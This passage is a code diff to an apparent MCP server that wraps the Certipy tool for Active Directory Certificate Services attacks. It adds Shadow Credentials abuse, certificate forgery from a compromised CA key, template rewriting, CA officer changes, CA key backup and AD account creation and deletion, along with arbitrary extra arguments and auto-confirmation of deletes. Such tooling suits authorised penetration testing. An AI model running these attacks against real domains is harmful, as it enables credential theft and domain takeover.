+                retryable=retryable,
+                suggestions=suggestions,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
@@ -1084,6 +1682,10 @@ class CertipyServer(BaseMCPServer):
         kirbi: bool = False,
         no_hash: bool = False,
         ldap_shell: bool = False,
+        username: Optional[str] = None,
+        ns: Optional[str] = None,
+        dns_tcp: bool = False,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Authenticate using a PFX certificate via PKINIT."""
@@ -1094,6 +1696,20 @@ class CertipyServer(BaseMCPServer):
             )
 
         self._ensure_work_dir()
+
+        # Certipy auth writes <principal>.ccache/.kirbi with no output-prefix
+        # option.  If a file with that name already exists (e.g. from a prior
+        # run on the same /session mount), certipy prompts "Overwrite? (y/n)"
+        # on stdin — but stdin is /dev/null so it gets EOF and aborts.
+        # Work-around: temporarily rename existing ccache/kirbi files before
+        # the run, then restore them after so we don't lose prior outputs.
+        backed_up: List[tuple] = []
+        for ext in ("*.ccache", "*.kirbi"):
+            for existing in glob.glob(os.path.join(WORK_DIR, ext)):
+                bak = existing + ".auth_bak"
+                os.rename(existing, bak)
+                backed_up.append((bak, existing))
+
         before = self._snapshot_files()
 
         cmd = [CERTIPY_BIN, "auth", "-pfx", pfx_path, "-dc-ip", dc_ip]
@@ -1108,13 +1724,36 @@ class CertipyServer(BaseMCPServer):
             cmd.append("-no-hash")
         if ldap_shell:
             cmd.append("-ldap-shell")
+        if username:
+            cmd.extend(["-username", username])
+        if ns:
+            cmd.extend(["-ns", ns])
+        if dns_tcp:
+            cmd.append("-dns-tcp")
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
 
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout)
+            result = await self.run_command_with_progress(cmd)
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
+
+            # Rename new ccache/kirbi files with unique prefix to avoid
+            # collisions on future runs and match the naming convention.
+            prefix = self._unique_prefix()
+            renamed_files = []
+            for fpath in new_files:
+                base = os.path.basename(fpath)
+                if base.endswith((".ccache", ".kirbi")):
+                    new_name = os.path.join(WORK_DIR, f"{prefix}_{base}")
+                    os.rename(fpath, new_name)
+                    renamed_files.append(new_name)
+                else:
+                    renamed_files.append(fpath)
+            new_files = renamed_files
+
             parsed = self._parse_auth_output(combined)
 
             # Update file paths if new files were created
@@ -1132,6 +1771,16 @@ class CertipyServer(BaseMCPServer):
             has_result = parsed["nt_hash"] is not None or len(new_files) > 0
             is_success = has_result and certipy_error is None
 
+            error_class, retryable, suggestions = (None, False, [])
+            error_msg = None
+            if not is_success:
+                if certipy_error:
+                    error_msg = certipy_error
+                    error_class, retryable, suggestions = self._classify_certipy_error(combined)
+                elif not has_result:
+                    error_msg = "Authentication failed -- no NT hash or TGT obtained. Check PFX validity and DC connectivity."
+                    error_class = "unknown"
+
             return ToolResult(
                 success=is_success,
                 data={
@@ -1144,13 +1793,23 @@ class CertipyServer(BaseMCPServer):
                     "output_files": new_files,
                 },
                 raw_output=sanitize_output(combined),
-                error=certipy_error or (
-                    "Authentication failed — no NT hash or TGT obtained. Check PFX validity and DC connectivity."
-                    if not has_result else None
-                ),
+                error=error_msg,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
+        finally:
+            # Restore backed-up ccache/kirbi files from prior runs
+            for bak_path, orig_path in backed_up:
+                if os.path.exists(bak_path):
+                    # If a new file was written to the same orig_path, it's
+                    # already been renamed with a prefix above, so safe to restore.
+                    if not os.path.exists(orig_path):
+                        os.rename(bak_path, orig_path)
+                    else:
+                        os.remove(bak_path)
 
     async def shadow(
         self,
@@ -1167,6 +1826,7 @@ class CertipyServer(BaseMCPServer):
         dns_tcp: bool = True,
         target: Optional[str] = None,
         device_id: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Shadow Credentials attack — abuse msDS-KeyCredentialLink."""
@@ -1193,19 +1853,31 @@ class CertipyServer(BaseMCPServer):
 
         cmd.extend(["-account", account])
 
-        # Output path for auto/add actions
-        # Use just filename because certipy's try_to_save_file replaces / with _
+        # Output prefix for auto/add actions — use unique prefix for ALL output files
+        # (PFX, ccache, etc.) to prevent "File already exists. Overwrite?" prompts
+        # that would kill the process via stdin EOF.
         if action in ("auto", "add"):
-            out_name = f"{prefix}_{account}"
-            cmd.extend(["-out", f"{out_name}.pfx"])
+            cmd.extend(["-out", f"{prefix}_{account}"])
 
         if device_id:
             cmd.extend(["-device-id", device_id])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
 
         auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
+
+        # Clean up any existing ccache/pfx for this account to prevent
+        # certipy's "File already exists. Overwrite? (y/n)" prompt which
+        # causes EOF on stdin (DEVNULL) and kills the process before NT hash output.
+        if action in ("auto", "add"):
+            for ext in (".ccache", ".pfx"):
+                stale = os.path.join(WORK_DIR, f"{account}{ext}")
+                if os.path.exists(stale):
+                    os.remove(stale)
+
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
@@ -1226,6 +1898,10 @@ class CertipyServer(BaseMCPServer):
             certipy_error = self._detect_certipy_error(combined)
             is_success = certipy_error is None
 
+            error_class, retryable, suggestions = (None, False, [])
+            if not is_success:
+                error_class, retryable, suggestions = self._classify_certipy_error(combined)
+
             return ToolResult(
                 success=is_success,
                 data={
@@ -1240,6 +1916,9 @@ class CertipyServer(BaseMCPServer):
                 },
                 raw_output=sanitize_output(combined),
                 error=certipy_error if not is_success else None,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
@@ -1256,6 +1935,7 @@ class CertipyServer(BaseMCPServer):
         serial: Optional[str] = None,
         key_size: int = 2048,
         validity_period: int = 365,
+        extra_args: Optional[str] = None,
         timeout: int = 120,
     ) -> ToolResult:
         """Forge certificates using compromised CA private key."""
@@ -1300,10 +1980,12 @@ class CertipyServer(BaseMCPServer):
             cmd.extend(["-key-size", str(key_size)])
         if validity_period != 365:
             cmd.extend(["-validity-period", str(validity_period)])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
 
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout)
+            result = await self.run_command_with_progress(cmd)
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
@@ -1342,6 +2024,7 @@ class CertipyServer(BaseMCPServer):
         dns_tcp: bool = True,
         target: Optional[str] = None,
         config_path: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """View or modify certificate template configuration."""
@@ -1370,20 +2053,31 @@ class CertipyServer(BaseMCPServer):
 
         cmd.extend(["-template", template])
 
-        if action == "save_config":
+        if action == "read":
+            # Certipy has no native "read" mode — running `template` with no
+            # action flags produces no output.  Use -save-configuration to dump
+            # the template to a JSON file, then return its contents.
+            save_name = f"{prefix}_{template}.json"
+            cmd.extend(["-save-configuration", save_name])
+        elif action == "save_config":
             save_name = f"{prefix}_{template}.json"
             cmd.extend(["-save-configuration", save_name])
         elif action == "write_default":
             cmd.append("-write-default-configuration")
-            cmd.append("-force")  # Skip confirmation prompt
+            cmd.append("-force")  # Skip "apply changes?" prompt
+            cmd.append("-no-save")  # Skip backup (prevents "file exists, overwrite?" prompt)
         elif action == "write_config":
             cmd.extend(["-write-configuration", config_path])
-            cmd.append("-force")  # Skip confirmation prompt
+            cmd.append("-force")  # Skip "apply changes?" prompt
+            cmd.append("-no-save")  # Skip backup (prevents "file exists, overwrite?" prompt)
+
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
 
         auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             new_files = self._find_new_files(before)
@@ -1412,21 +2106,33 @@ class CertipyServer(BaseMCPServer):
             # Additional heuristic: if save_config produced no JSON file, or
             # if the output is just the certipy banner (silent failure on auth),
             # treat as failure. Certipy sometimes exits 0 with no error message.
-            if certipy_error is None and action == "save_config" and not json_files:
+            silent_failure = False
+            if certipy_error is None and action in ("save_config", "read") and not json_files:
                 certipy_error = "No configuration saved — certipy may have failed silently. Check credentials and template name."
-            elif certipy_error is None and action == "read":
-                # Strip the banner to check for actual template content
-                stripped = re.sub(r"Certipy v[\d.]+ - by Oliver Lyak \(ly4k\)\s*", "", combined).strip()
-                if not stripped:
-                    certipy_error = "No template data returned — certipy may have failed silently. Check credentials and template name."
+                silent_failure = True
 
             is_success = certipy_error is None
+
+            error_class, retryable, suggestions = (None, False, [])
+            if not is_success:
+                error_class, retryable, suggestions = self._classify_certipy_error(combined)
+                # Silent failures (empty output) are almost always auth issues
+                if silent_failure and error_class == "unknown":
+                    error_class = "auth"
+                    retryable = True
+                    suggestions = [
+                        "Certipy returned no output — likely an authentication failure",
+                        "Verify credentials and ensure LDAP connectivity to the DC",
+                    ]
 
             return ToolResult(
                 success=is_success,
                 data=data,
                 raw_output=sanitize_output(combined),
                 error=certipy_error if not is_success else None,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
@@ -1441,6 +2147,11 @@ class CertipyServer(BaseMCPServer):
         disable_template: Optional[str] = None,
         issue_request: Optional[int] = None,
         deny_request: Optional[int] = None,
+        add_officer: Optional[str] = None,
+        remove_officer: Optional[str] = None,
+        backup: bool = False,
+        config: Optional[str] = None,
+        list_templates: bool = False,
         password: Optional[str] = None,
         hashes: Optional[str] = None,
         kerberos: bool = False,
@@ -1449,6 +2160,7 @@ class CertipyServer(BaseMCPServer):
         ns: Optional[str] = None,
         dns_tcp: bool = True,
         target: Optional[str] = None,
+        extra_args: Optional[str] = None,
         timeout: int = 300,
     ) -> ToolResult:
         """Manage Certificate Authority: enable/disable templates, approve/deny requests (ESC7)."""
@@ -1483,10 +2195,31 @@ class CertipyServer(BaseMCPServer):
             cmd.extend(["-deny-request", str(deny_request)])
             action_desc = f"deny request {deny_request}"
 
+        if add_officer:
+            cmd.extend(["-add-officer", add_officer])
+            if action_desc == "unknown":
+                action_desc = f"add officer '{add_officer}'"
+        if remove_officer:
+            cmd.extend(["-remove-officer", remove_officer])
+            if action_desc == "unknown":
+                action_desc = f"remove officer '{remove_officer}'"
+        if backup:
+            cmd.append("-backup")
+            if action_desc == "unknown":
+                action_desc = "backup CA private key"
+        if config:
+            cmd.extend(["-config", config])
+        if list_templates:
+            cmd.append("-list-templates")
+            if action_desc == "unknown":
+                action_desc = "list templates"
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+
         auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
         combined = ""
         try:
-            result = await self.run_command(cmd, timeout=timeout, env=auth_env)
+            result = await self.run_command_with_progress(cmd, env=auth_env)
             combined = result.stdout + result.stderr
 
             certipy_error = self._detect_certipy_error(combined)
@@ -1497,10 +2230,16 @@ class CertipyServer(BaseMCPServer):
                 "Successfully disabled",
                 "Successfully issued",
                 "Successfully denied",
+                "Successfully added",
+                "Successfully removed",
                 "approved",
             ]
             has_success = any(ind.lower() in combined.lower() for ind in success_indicators)
             is_success = (certipy_error is None and result.returncode == 0) or has_success
+
+            error_class, retryable, suggestions = (None, False, [])
+            if not is_success:
+                error_class, retryable, suggestions = self._classify_certipy_error(combined)
 
             return ToolResult(
                 success=is_success,
@@ -1515,6 +2254,289 @@ class CertipyServer(BaseMCPServer):
                 },
                 raw_output=sanitize_output(combined),
                 error=certipy_error if not is_success else None,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
+            )
+        except Exception as e:
+            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
+
+    async def account(
+        self,
+        username: str,
+        dc_ip: str,
+        user: str,
+        action: str = "read",
+        password: Optional[str] = None,
+        hashes: Optional[str] = None,
+        kerberos: bool = False,
+        aes_key: Optional[str] = None,
+        ccache_path: Optional[str] = None,
+        ns: Optional[str] = None,
+        dns_tcp: bool = True,
+        target: Optional[str] = None,
+        group: Optional[str] = None,
+        account_dns: Optional[str] = None,
+        upn: Optional[str] = None,
+        sam: Optional[str] = None,
+        spns: Optional[str] = None,
+        account_pass: Optional[str] = None,
+        extra_args: Optional[str] = None,
+        timeout: int = 300,
+    ) -> ToolResult:
+        """Create, read, update, or delete AD accounts for ADCS exploitation."""
+        if not password and not hashes and not kerberos and not aes_key:
+            return ToolResult(
+                success=False,
+                error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true.",
+            )
+
+        self._ensure_work_dir()
+
+        cmd = [CERTIPY_BIN, "account"]
+        cmd.extend(self._build_auth_args(
+            username=username, dc_ip=dc_ip, password=password,
+            hashes=hashes, kerberos=kerberos, aes_key=aes_key,
+            ns=ns, dns_tcp=dns_tcp, target=target,
+        ))
+
+        cmd.extend(["-user", user])
+
+        if group:
+            cmd.extend(["-group", group])
+        if account_dns:
+            cmd.extend(["-dns", account_dns])
+        if upn:
+            cmd.extend(["-upn", upn])
+        if sam:
+            cmd.extend(["-sam", sam])
+        if spns:
+            cmd.extend(["-spns", spns])
+        if account_pass:
+            cmd.extend(["-pass", account_pass])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+
+        # Action is a positional argument (create/read/update/delete)
+        cmd.append(action)
+
+        # Certipy's delete action prompts "Are you sure? (y/N):" on stdin.
+        # Since run_command_with_progress uses stdin=DEVNULL, the prompt gets
+        # EOF and the command aborts.  Wrap with `yes` to auto-confirm.
+        if action == "delete":
+            cmd = ["bash", "-c", "yes | " + " ".join(shlex.quote(c) for c in cmd)]
+
+        auth_env = self._get_auth_env(ccache_path=ccache_path) if kerberos else {}
+        combined = ""
+        try:
+            result = await self.run_command_with_progress(cmd, env=auth_env)
+            combined = result.stdout + result.stderr
+
+            certipy_error = self._detect_certipy_error(combined)
+            is_success = certipy_error is None and result.returncode == 0
+
+            error_class, retryable, suggestions = (None, False, [])
+            if not is_success:
+                if certipy_error:
+                    error_class, retryable, suggestions = self._classify_certipy_error(combined)
+                else:
+                    certipy_error = f"Account {action} failed -- check output for details"
+
+            return ToolResult(
+                success=is_success,
+                data={
+                    "method": "account",
+                    "action": action,
+                    "user": user,
+                },
+                raw_output=sanitize_output(combined),
+                error=certipy_error if not is_success else None,
+                error_class=error_class,
+                retryable=retryable,
+                suggestions=suggestions,
+            )
+        except Exception as e:
+            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
+
+    async def cert(
+        self,
+        pfx_path: Optional[str] = None,
+        pfx_password: Optional[str] = None,
+        key_path: Optional[str] = None,
+        cert_path: Optional[str] = None,
+        export: bool = False,
+        out: Optional[str] = None,
+        nocert: bool = False,
+        nokey: bool = False,
+        export_password: Optional[str] = None,
+        extra_args: Optional[str] = None,
+        timeout: int = 60,
+    ) -> ToolResult:
+        """Convert between certificate formats — extract PEM from PFX, combine key+cert into PFX."""
+        if not pfx_path and not key_path and not cert_path:
+            return ToolResult(
+                success=False,
+                error="Must specify at least one input: pfx_path, key_path, or cert_path.",
+            )
+
+        # Validate input files exist
+        for path, label in [(pfx_path, "PFX"), (key_path, "key"), (cert_path, "cert")]:
+            if path and not os.path.isfile(path):
+                return ToolResult(
+                    success=False,
+                    error=f"{label} file not found: {path}",
+                )
+
+        self._ensure_work_dir()
+        prefix = self._unique_prefix()
+        before = self._snapshot_files()
+
+        cmd = [CERTIPY_BIN, "cert"]
+
+        if pfx_path:
+            cmd.extend(["-pfx", pfx_path])
+        if pfx_password:
+            cmd.extend(["-password", pfx_password])
+        if key_path:
+            cmd.extend(["-key", key_path])
+        if cert_path:
+            cmd.extend(["-cert", cert_path])
+        if export:
+            cmd.append("-export")
+
+        # Auto-generate output path if none specified.  Without -out,
+        # certipy cert prints PEM to stdout which we'd only capture in
+        # raw_output — not very useful for downstream tools.
+        if out:
+            cmd.extend(["-out", out])
+        elif not export:
+            # Determine a sensible filename
+            input_name = os.path.splitext(os.path.basename(
+                pfx_path or key_path or cert_path or "cert"))[0]
+            auto_out = os.path.join(WORK_DIR, f"{prefix}_{input_name}.pem")
+            cmd.extend(["-out", auto_out])
+
+        if nocert:
+            cmd.append("-nocert")
+        if nokey:
+            cmd.append("-nokey")
+        if export_password:
+            cmd.extend(["-export-password", export_password])
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+
+        combined = ""
+        try:
+            result = await self.run_command_with_progress(cmd)
+            combined = result.stdout + result.stderr
+
+            new_files = self._find_new_files(before)
+
+            is_success = result.returncode == 0
+            error_msg = None
+            if not is_success:
+                error_msg = self._detect_certipy_error(combined) or "Certificate conversion failed"
+
+            return ToolResult(
+                success=is_success,
+                data={
+                    "method": "cert",
+                    "output_files": new_files,
+                },
+                raw_output=sanitize_output(combined),
+                error=error_msg,
+            )
+        except Exception as e:
+            return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
+
+    async def parse(
+        self,
+        input_file: str,
+        format: str = "bof",
+        domain: Optional[str] = None,
+        ca_name: Optional[str] = None,
+        sids: Optional[str] = None,
+        published: Optional[str] = None,
+        vulnerable: bool = False,
+        enabled: bool = False,
+        hide_admins: bool = False,
+        output_stdout: bool = False,
+        extra_args: Optional[str] = None,
+        timeout: int = 120,
+    ) -> ToolResult:
+        """Offline ADCS analysis — parse BOF output or registry exports."""
+        if not os.path.isfile(input_file):
+            return ToolResult(
+                success=False,
+                error=f"Input file not found: {input_file}",
+            )
+
+        self._ensure_work_dir()
+        prefix = self._unique_prefix()
+        before = self._snapshot_files()
+
+        cmd = [CERTIPY_BIN, "parse"]
+
+        # Output options — always produce JSON + text
+        cmd.extend(["-json", "-text"])
+        cmd.extend(["-output", prefix])
+
+        if format != "bof":
+            cmd.extend(["-format", format])
+        if domain:
+            cmd.extend(["-domain", domain])
+        if ca_name:
+            cmd.extend(["-ca", ca_name])
+        if sids:
+            cmd.extend(["-sids", sids])
+        if published:
+            cmd.extend(["-published", published])
+        if vulnerable:
+            cmd.append("-vulnerable")
+        if enabled:
+            cmd.append("-enabled")
+        if hide_admins:
+            cmd.append("-hide-admins")
+        if output_stdout:
+            cmd.append("-stdout")
+        if extra_args:
+            cmd.extend(shlex.split(extra_args))
+
+        # Input file is a positional argument
+        cmd.append(input_file)
+
+        combined = ""
+        try:
+            result = await self.run_command_with_progress(cmd)
+            combined = result.stdout + result.stderr
+
+            new_files = self._find_new_files(before)
+            json_files = [f for f in new_files if f.endswith(".json")]
+            text_files = [f for f in new_files if f.endswith(".txt")]
+
+            # Parse JSON if available (same format as find)
+            parsed = {}
+            if json_files:
+                parsed = self._parse_find_json(json_files)
+
+            is_success = result.returncode == 0
+            error_msg = None
+            if not is_success:
+                error_msg = self._detect_certipy_error(combined) or "Parse failed -- check input file format"
+
+            return ToolResult(
+                success=is_success,
+                data={
+                    "method": "parse",
+                    "input_file": input_file,
+                    "format": format,
+                    "output_files": new_files,
+                    "json_file": json_files[0] if json_files else None,
+                    "text_file": text_files[0] if text_files else None,
+                    **parsed,
+                },
+                raw_output=sanitize_output(combined),
+                error=error_msg,
             )
         except Exception as e:
             return ToolResult(success=False, error=str(e), raw_output=sanitize_output(combined))
